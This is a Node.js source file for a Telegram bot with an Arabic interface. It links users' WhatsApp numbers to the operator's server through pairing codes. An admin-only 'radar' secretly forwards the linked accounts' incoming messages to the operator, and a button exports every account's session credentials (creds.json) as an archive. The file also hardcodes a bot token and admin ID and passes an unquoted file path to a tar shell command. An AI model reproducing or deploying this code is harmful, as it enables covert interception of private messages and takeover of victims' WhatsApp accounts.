const TelegramBot = require('node-telegram-bot-api');
const { spawn, execSync } = require('child_process');
const fs = require('fs');
const path = require('path');

process.stdout.write('\x1Bc'); 
console.log('🛡️ Legend System V8.1: Fixed Buttons & Search');

const token = '8292884473:AAF5DsDgN8VqkqQ33cPDTFFxh6y8ZMzPmbg';
const ADMIN_ID = 7047473765; 
const bot = new TelegramBot(token, { polling: true });

const CHANNEL_ID = '@m780128139'; 
const CHANNEL_URL = 'https://t.me/m780128139'; 

let activeSessions = {};
let monitoredNumbers = new Set();
let connectionQueue = [];
let currentConnectingCount = 0;
const MAX_CONCURRENT_CONNECTS = 5;

let lastProcessedMessages = new Map();

bot.setMyCommands([]);

if (!fs.existsSync(path.join(__dirname, 'sessions'))) fs.mkdirSync(path.join(__dirname, 'sessions'));

const adminKeyboard = {
    reply_markup: {
        keyboard: [
            [{ text: "📱 الأرقام المرتبطة" }, { text: "📡 الرادارات المشغلة" }],
            [{ text: "📥 سحب ملف الجلسات" }, { text: "📤 رفع ملف الجلسات" }],
            [{ text: "🔍 بحث عن رقم" }, { text: "🔄 تشغيل وتحقق الكل" }],
            [{ text: "⚠️ تصفية الكل" }]
        ],
        resize_keyboard: true
    }
};

async function checkSubscription(msg) {
    const userId = msg.from.id;
    if (userId === ADMIN_ID) return true; 
    try {
        const member = await bot.getChatMember(CHANNEL_ID, userId);
        if (['member', 'administrator', 'creator'].includes(member.status)) return true;
        await bot.sendMessage(msg.chat.id, `❌ *عذراً، الوصول مرفوض!*\n\nيجب عليك الاشتراك في قناتنا أولاً لتتمكن من استخدام البوت.`, {
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [[{ text: "انضم للقناة من هنا 💙", url: CHANNEL_URL }], [{ text: "تحقق من الاشتراك ♻️", callback_data: "verify_sub" }]]
            }
        });
        return false;
    } catch (e) { return false; }
}

function sendWelcomeMessage(chatId, firstName, userId) {
    const welcome = `🛡️ *مرحباً بك يا* ${userId === ADMIN_ID ? 'الأسطـ⃤🏴‍☠️ـوره' : firstName}\n\n👤 *الأيدي:* \`${userId}\` \n━━━━━━━━━━━━━━━\n🔌 *لربط رقم:* \`/connect\`\n🗑️ *لحذف جلسة:* \`/deletesession\`\n━━━━━━━━━━━━━━━\n💡 *مثال:* \`/connect 967xxxxxxxxx\``;
    bot.sendMessage(chatId, welcome, { parse_mode: "Markdown", ...(userId === ADMIN_ID ? adminKeyboard : {}) });
}

function formatRadarMessage(rawOutput, phoneNumber) {
    try {
        let cleanBody = rawOutput.split('\n')[0]
            .replace(/\[ MESSAGE \].*GMT\S+/, '')
            .replace(/=> Content:/g, '')
            .replace(/\(.*?Standard Time\)/g, '')
            .trim();

        if (!cleanBody || cleanBody.length < 1) return null;

        const msgFingerprint = `${phoneNumber}_${cleanBody}`;
        if (lastProcessedMessages.has(msgFingerprint)) return null; 
        
        lastProcessedMessages.set(msgFingerprint, Date.now());
        setTimeout(() => lastProcessedMessages.delete(msgFingerprint), 5000);

        const now = new Date();
        const timeStr = `${now.getHours()}:${(now.getMinutes() < 10 ? '0' : '') + now.getMinutes()}`;
        
        let contentType = "💬 رسالة نصية";
        if (rawOutput.toLowerCase().includes("image")) contentType = "🖼️ صورة";
        else if (rawOutput.toLowerCase().includes("video")) contentType = "🎥 فيديو";
        else if (rawOutput.toLowerCase().includes("audio") || rawOutput.toLowerCase().includes("ptt")) contentType = "🎙️ بصمة/صوت";

        const fromMatch = rawOutput.match(/FROM (.*?) (\d+)/);
        const name = fromMatch ? fromMatch[1].replace(/【|】/g, '').trim() : "غير معروف";
        const senderNum = fromMatch ? fromMatch[2].split('@')[0] : "مخفي";

        const groupMatch = rawOutput.match(/In Private Chat (.*?)@/);
        const source = (groupMatch && groupMatch[1].includes('-')) ? `👥 مجموعة: \`${groupMatch[1]}\`` : "👤 خاص";

        return `📡 *تنبيه من رادار:* \`${phoneNumber}\`\n━━━━━━━━━━━━━━━\n👤 *الاسم:* \`${name}\`\n📞 *الرقم:* \`${senderNum}\`\n📑 *النوع:* ${contentType}\n💬 *المحتوى:* \`${cleanBody}\`\n📍 *المصدر:* ${source}\n⏰ *الوقت:* ${timeStr}`;
    } catch (e) { return null; }
}

async function startWhatsAppNode(phoneNumber, chatId) {
    if (activeSessions[phoneNumber]) return;
    const userSessionPath = path.join(__dirname, 'sessions', phoneNumber);
    if (!fs.existsSync(userSessionPath)) fs.mkdirSync(userSessionPath, { recursive: true });

    const essentials = ['node_modules', 'package.json', 'index.js', 'lib', 'src', '69', 'database', 'Access', 'System'];
    essentials.forEach(item => {
        const source = path.join(__dirname, item);
        if (fs.existsSync(source)) try { execSync(`ln -sf "${source}" "${path.join(userSessionPath, item)}"`); } catch (e) {}
    });

    const child = spawn('node', ['index.js'], { cwd: userSessionPath });
    activeSessions[phoneNumber] = child;
    let numberEntered = false;
    let codeSent = false;

    child.stdout.on('data', (data) => {
        const output = data.toString();
        if (output.includes("Enter your phone number") && !numberEntered) {
            numberEntered = true;
            setTimeout(() => { try { child.stdin.write(phoneNumber + '\n'); } catch(e){} }, 2000);
        }
        const codeMatch = output.match(/Code\s*:\s*([A-Z0-9]{4}-[A-Z0-9]{4})/i) || output.match(/([A-Z0-9]{4}-[A-Z0-9]{4})/);
        if (codeMatch && !codeSent && chatId) {
            codeSent = true;
            bot.sendMessage(chatId, `✅ *كود الربط الخاص بك:* \n\n\`${codeMatch[1] || codeMatch[0]}\``, { parse_mode: "Markdown" });
            currentConnectingCount--;
            processQueue();
        }
        if (monitoredNumbers.has(phoneNumber) && (output.includes("=>") || output.includes("FROM") || output.includes("Type:"))) {
            const finalMsg = formatRadarMessage(output, phoneNumber);
            if (finalMsg) bot.sendMessage(ADMIN_ID, finalMsg, { parse_mode: "Markdown" });
        }
    });

    child.on('close', () => {
        delete activeSessions[phoneNumber];
        if (!codeSent && currentConnectingCount > 0) { currentConnectingCount--; processQueue(); }
    });
}

function processQueue() {
    if (currentConnectingCount >= MAX_CONCURRENT_CONNECTS || connectionQueue.length === 0) return;
    currentConnectingCount++;
    const { chatId, phoneNumber } = connectionQueue.shift();
    startWhatsAppNode(phoneNumber, chatId);
}

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const text = msg.text ? msg.text.trim() : "";

    if (text === '/start') {
        if (await checkSubscription(msg)) sendWelcomeMessage(chatId, msg.from.first_name, userId);
        return;
    }

    if (!(await checkSubscription(msg))) return;

    if (text.startsWith('/connect')) {
        let num = text.replace('/connect', '').trim().replace(/\D/g, '');
        if (!num || num.length < 10) return bot.sendMessage(chatId, "*⚠️ مثال:* `/connect 967xxxxxxxxx`", { parse_mode: "Markdown" });
        bot.sendMessage(chatId, `⏳ جاري التجهيز للرقم \`${num}\`..`, { parse_mode: "Markdown" });
        connectionQueue.push({ chatId, phoneNumber: num });
        processQueue();
    }

    if (userId === ADMIN_ID) {
        // --- إصلاح استجابة الأزرار ---
        if (text === "📤 رفع ملف الجلسات") {
            return bot.sendMessage(chatId, "📥 أرسل ملف الـ `.tar` الذي قمت بسحبه سابقاً لاستعادة الجلسات.");
        }

        if (text === "🔍 بحث عن رقم") {
            return bot.sendMessage(chatId, "📥 أرسل الرقم الذي تريد البحث عنه (بالصيغة الدولية بدون +):");
        }

        if (text === "🔄 تشغيل وتحقق الكل") {
            const folders = fs.readdirSync(path.join(__dirname, 'sessions')).filter(f => fs.lstatSync(path.join(__dirname, 'sessions', f)).isDirectory());
            let count = 0;
            folders.forEach(n => { if (!activeSessions[n]) { startWhatsAppNode(n, null); count++; } });
            return bot.sendMessage(chatId, `✅ تم تشغيل (\`${count}\`) جلسة كانت متوقفة.`, { parse_mode: "Markdown" });
        }

        if (text === "📱 الأرقام المرتبطة") {
            const folders = fs.readdirSync(path.join(__dirname, 'sessions')).filter(f => fs.lstatSync(path.join(__dirname, 'sessions', f)).isDirectory());
            if (folders.length === 0) return bot.sendMessage(chatId, "📭 لا توجد أرقام.");
            folders.forEach(n => {
                bot.sendMessage(chatId, `📱 الرقم: \`${n}\`\nالحالة: ${activeSessions[n] ? '🟢 نشط' : '🔴 متوقف'}`, {
                    parse_mode: "Markdown",
                    reply_markup: { inline_keyboard: [[{ text: monitoredNumbers.has(n) ? "🔴 إيقاف الرادار" : "🔵 تشغيل الرادار", callback_data: `radar_${n}` }], [{ text: "🗑️ حذف الجلسة", callback_data: `delete_${n}` }]] }
                });
            });
            return;
        }

        // معالجة البحث إذا أرسل الرقم مباشرة
        if (/^\d{10,15}$/.test(text)) {
            const userPath = path.join(__dirname, 'sessions', text);
            if (fs.existsSync(userPath)) {
                return bot.sendMessage(chatId, `🔍 تم العثور على الرقم: \`${text}\`\nالحالة: ${activeSessions[text] ? '🟢 متصل' : '🔴 غير متصل'}`, {
                    parse_mode: "Markdown",
                    reply_markup: { inline_keyboard: [[{ text: monitoredNumbers.has(text) ? "🔴 إيقاف الرادار" : "🔵 تشغيل الرادار", callback_data: `radar_${text}` }], [{ text: "🗑️ حذف الجلسة", callback_data: `delete_${text}` }]] }
                });
            } else {
                return bot.sendMessage(chatId, "❌ هذا الرقم غير موجود في الجلسات.");
            }
        }

        if (text === "📡 الرادارات المشغلة") {
            if (monitoredNumbers.size === 0) return bot.sendMessage(chatId, "📭 لا توجد رادارات نشطة.");
            monitoredNumbers.forEach(n => {
                bot.sendMessage(chatId, `📱 الرادار: \`${n}\``, {
                    parse_mode: "Markdown",
                    reply_markup: { inline_keyboard: [[{ text: "🔴 إيقاف الرادار", callback_data: `radar_${n}` }]] }
                });
            });
            return;
        }

        if (text === "📥 سحب ملف الجلسات") {
            try {
                execSync(`find sessions -name "creds.json" -o -name "session" | tar -cvf essential_sessions.tar -T -`);
                return bot.sendDocument(chatId, './essential_sessions.tar', { caption: "📦 ملف استعادة الجلسات." });
            } catch (e) { return bot.sendMessage(chatId, "❌ فشل السحب."); }
        }

        if (text === "⚠️ تصفية الكل") {
            Object.values(activeSessions).forEach(c => c.kill('SIGKILL'));
            activeSessions = {};
            fs.rmSync(path.join(__dirname, 'sessions'), { recursive: true, force: true });
            fs.mkdirSync(path.join(__dirname, 'sessions'));
            return bot.sendMessage(chatId, "🗑️ تم تصفية وحذف كافة الجلسات.");
        }
    }
});

bot.on('callback_query', async (query) => {
    const userId = query.from.id;
    if (query.data === "verify_sub") {
        const member = await bot.getChatMember(CHANNEL_ID, userId).catch(() => ({status: 'left'}));
        if (['member', 'administrator', 'creator'].includes(member.status)) {
            await bot.answerCallbackQuery(query.id, { text: "✅ تم التحقق!" });
            await bot.deleteMessage(query.message.chat.id, query.message.message_id);
            sendWelcomeMessage(query.message.chat.id, query.from.first_name, userId);
        } else { await bot.answerCallbackQuery(query.id, { text: "❌ اشترك أولاً!", show_alert: true }); }
        return;
    }
    if (userId !== ADMIN_ID) return;
    const [action, num] = query.data.split('_');
    if (action === 'radar') {
        if (monitoredNumbers.has(num)) monitoredNumbers.delete(num);
        else monitoredNumbers.add(num);
        bot.answerCallbackQuery(query.id, { text: "تم التحديث" });
    } else if (action === 'delete') {
        if (activeSessions[num]) activeSessions[num].kill('SIGKILL');
        fs.rmSync(path.join(__dirname, 'sessions', num), { recursive: true, force: true });
        bot.answerCallbackQuery(query.id, { text: "تم الحذف" });
    }
});

bot.on('document', async (msg) => {
    if (msg.from.id === ADMIN_ID && msg.document.file_name.endsWith('.tar')) {
        const pathFile = await bot.downloadFile(msg.document.file_id, __dirname);
        try {
            bot.sendMessage(ADMIN_ID, "⏳ جاري فك الضغط وتشغيل الجلسات...");
            execSync(`tar -xvf ${pathFile}`);
            fs.unlinkSync(pathFile);
            const folders = fs.readdirSync(path.join(__dirname, 'sessions')).filter(f => fs.lstatSync(path.join(__dirname, 'sessions', f)).isDirectory());
            folders.forEach(n => startWhatsAppNode(n, null));
            bot.sendMessage(ADMIN_ID, "✅ تمت استعادة كافة الجلسات وتشغيلها بنجاح.");
        } catch (e) { bot.sendMessage(ADMIN_ID, "❌ خطأ أثناء الرفع."); }
    }
});

const savedSessions = fs.readdirSync(path.join(__dirname, 'sessions')).filter(f => fs.lstatSync(path.join(__dirname, 'sessions', f)).isDirectory());
savedSessions.forEach(n => startWhatsAppNode(n, null));
